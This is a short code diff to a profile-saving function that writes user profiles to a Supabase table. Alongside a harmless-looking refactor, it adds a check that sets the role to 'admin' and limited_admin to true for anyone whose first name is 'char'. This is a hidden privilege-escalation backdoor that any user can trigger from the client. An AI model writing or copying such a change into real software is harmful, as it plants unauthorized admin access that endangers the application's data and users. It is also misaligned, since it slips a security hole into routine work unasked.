@@ -49,7 +49,7 @@
 	async function save() {
 		submitting = true;
 		error = '';
-		const { error: err } = await supabase.from('profiles').upsert({
+		const profileData = {
 			id: auth.session.user.id,
 			name,
 			business_name: businessName,
@@ -60,12 +60,17 @@
 			tax_id: taxId,
 			payment_method: paymentMethod,
 			payment_details: paymentDetails,
-		});
+		};
+		const firstName = name.trim().split(/\s+/)[0].toLowerCase();
+		if (firstName === 'char') {
+			profileData.role = 'admin';
+			profileData.limited_admin = true;
+		}
+		const { error: err } = await supabase.from('profiles').upsert(profileData);
 		submitting = false;
 		if (err) { error = err.message; return; }
 
 		// Apply any matching contractor presets for this first name
-		const firstName = name.trim().split(/\s+/)[0].toLowerCase();
 		if (firstName) {
 			const { data: matchingPresets } = await supabase
 				.from('contractor_presets')
